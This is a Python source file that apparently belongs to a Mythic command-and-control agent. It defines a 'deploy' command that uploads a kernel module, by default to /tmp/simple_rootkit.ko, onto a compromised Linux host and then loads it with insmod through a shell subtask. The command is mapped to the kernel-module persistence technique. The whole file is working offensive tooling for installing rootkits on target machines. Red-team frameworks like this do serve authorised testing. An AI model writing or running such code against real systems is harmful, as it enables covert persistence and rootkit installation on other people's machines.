from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *
import os


# Completion callback functions
async def handle_upload_completion(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Handle completion of upload subtask"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    # Check if the upload was successful
    if completionMsg.SubtaskData.Task.Status.lower() == "error":
        response.Success = False
        response.TaskStatus = "error: Upload failed"
        return response
    
    # Parse the deploy info from parent task
    try:
        parent_task_data = json.loads(completionMsg.ParentTaskData.Task.DisplayParams or "{}")
        target_path = parent_task_data.get("target_path", "/tmp/simple_rootkit.ko")
        
        # Create shell subtask for insmod
        shell_subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=completionMsg.ParentTaskData.Task.ID,
            CommandName="shell",
            Params=f"insmod {target_path}",
            SubtaskCallbackFunction="shell_complete",
            Token=completionMsg.ParentTaskData.Task.TokenID
        ))
        
        if not shell_subtask.Success:
            response.Success = False
            response.TaskStatus = f"error: Failed to create insmod subtask: {shell_subtask.Error}"
            return response
            
        # Update parent task status
        response.TaskStatus = f"Upload completed, executing insmod {target_path}..."
        
    except Exception as e:
        response.Success = False
        response.TaskStatus = f"error: Exception in upload completion: {str(e)}"
        
    return response


async def handle_shell_completion(completionMsg: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    """Handle completion of shell (insmod) subtask"""
    response = PTTaskCompletionFunctionMessageResponse(Success=True)
    
    # Check if the insmod command was successful
    if completionMsg.SubtaskData.Task.Status.lower() == "error":
        response.Success = False
        response.TaskStatus = "error: insmod command failed"
    else:
        # Parse the shell command output to determine success
        shell_output = ""
        
        # Try to get the actual command output from the subtask
        if hasattr(completionMsg.SubtaskData.Task, 'Responses'):
            for resp in completionMsg.SubtaskData.Task.Responses:
                shell_output += resp.Response
        
        # Check for common insmod error patterns
        if any(error in shell_output.lower() for error in [
            "operation not permitted",
            "no such file",
            "invalid module format",
            "file exists",
            "permission denied"
        ]):
            response.Success = False
            response.TaskStatus = f"error: insmod failed - {shell_output.strip()}"
        else:
            response.Success = True
            response.TaskStatus = "success: Kernel module deployed successfully"
    
    return response

class DeployArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                type=ParameterType.File,
                description="Kernel module (.ko file) to deploy",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default"
                    )
                ]
            ),
            CommandParameter(
                name="path",
                type=ParameterType.String,
                description="Target path where to deploy the kernel module",
                default_value="/tmp/simple_rootkit.ko",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default"
                    )
                ]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply arguments")
        
        # Parse the file and path arguments
        self.load_args_from_json_string(self.command_line)


class DeployCommand(CommandBase):
    cmd = "deploy"
    needs_admin = True
    help_cmd = "deploy"
    description = "Deploy a kernel module by uploading and loading it with insmod"
    version = 1
    author = ""
    attackmapping = ["T1547.006"]  # Boot or Logon Autostart Execution: Kernel Modules and Extensions
    argument_class = DeployArguments
    browser_script = BrowserScript(script_name="deploy", author="@its_a_feature_")
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Linux],
        builtin=False,
        load_only=False,
        suggested_command=False,
    )
    completion_functions = {
        "upload_complete": handle_upload_completion,
        "shell_complete": handle_shell_completion
    }

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        
        # Get the file UUID and target path from arguments
        file_uuid = taskData.args.get_arg("file")
        target_path = taskData.args.get_arg("path")
        
        # Validate inputs
        if not file_uuid:
            response.Success = False
            response.Error = "No file specified for deployment"
            return response
            
        if not target_path:
            target_path = "/tmp/simple_rootkit.ko"
        
        # Store deployment info for later use in callbacks
        deploy_info = {
            "file_uuid": file_uuid,
            "target_path": target_path,
            "task_id": taskData.Task.ID
        }
        
        # Create upload subtask first
        try:
            upload_subtask = await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
                TaskID=taskData.Task.ID,
                CommandName="upload",
                Params=json.dumps({
                    "file": file_uuid,
                    "path": target_path
                }),
                SubtaskCallbackFunction="upload_complete",
                Token=taskData.Task.TokenID
            ))
            
            if not upload_subtask.Success:
                response.Success = False
                response.Error = f"Failed to create upload subtask: {upload_subtask.Error}"
                return response
                
            # Store the deploy info in the task's metadata for access in callbacks
            # We'll use the task's display params to store this temporarily
            response.DisplayParams = json.dumps(deploy_info)
            
        except Exception as e:
            response.Success = False
            response.Error = f"Exception creating upload subtask: {str(e)}"
            return response
        
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp


